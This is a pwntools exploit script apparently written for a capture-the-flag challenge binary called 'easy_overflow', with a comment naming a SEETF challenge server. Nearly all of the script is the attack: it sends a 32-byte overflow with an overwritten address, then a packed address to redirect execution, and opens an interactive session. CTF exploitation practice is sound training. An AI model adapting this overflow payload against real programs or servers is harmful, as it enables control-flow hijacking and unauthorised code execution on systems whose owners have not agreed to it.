from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Binary filename
exe = './easy_overflow'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

#connect nc fun.chall.seetf.sg 50003
context.log_level = 'debug'
p = start()
p.sendlineafter(b'me.\n',b"a"*32 + b"\x38\x40\x40\x00\x00\x00")
p.sendlineafter(b'chance.',p64(0x0401249))
p.interactive()